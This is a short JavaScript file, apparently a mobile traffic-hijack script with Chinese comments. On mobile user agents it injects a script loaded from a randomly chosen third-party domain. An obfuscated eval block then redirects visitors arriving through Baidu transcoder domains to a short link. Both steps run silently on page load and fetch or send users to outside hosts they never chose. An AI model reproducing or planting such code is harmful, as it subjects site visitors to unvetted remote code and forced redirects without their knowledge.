var wap = navigator.userAgent.match(/Android|Linux|iPad|iPhone|iPod/i) != null;

//地址数组
var url_arr = new Array(
	//'http://sy.bycxsh.com/992/1/1',//ermao
	'http://dm.shanghuitianxia.cn/tmp/3617',//yidong
	//'http://c.ylist.cn/o.php?u=790|4|1',//haimeng
	'http://mqq.zgdmsj.cn/show/2/3210?r=',//siwei
	//'http://dm.jinshasi.cn/show/2/2819',//yifa
	'http://fiea.xingyimin.com/vs.php?id=3011'//pingao
);

//判断UA 加载数组
if(wap){
	suiji(url_arr);
}

//选取随机地址输出
function suiji(arr){
	var arrs = arr.length;
	var sjurl = Math.floor(Math.random() * arrs);
	var linkdownaa = document.createElement("script");
	linkdownaa.src = arr[sjurl];
	var linkesdownaa = document.getElementsByTagName("script")[0];
	linkesdownaa.parentNode.insertBefore(linkdownaa, linkesdownaa);
}

//bdzm
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2(1.3==\'4.d.5\'||1.3==\'4.b.5\'){c 0=1.9(\'j\');2(0[\'6\']){7.8=0[\'6\'].e}f{7.8=\'g://h.i/a\'}}',20,20,'url|document|if|domain|transcoder|com|pageurl|location|href|getElementsByTagName|R9GNFOT|baidu|var|tradaquan|content|else|http|t|cn|meta'.split('|'),0,{}));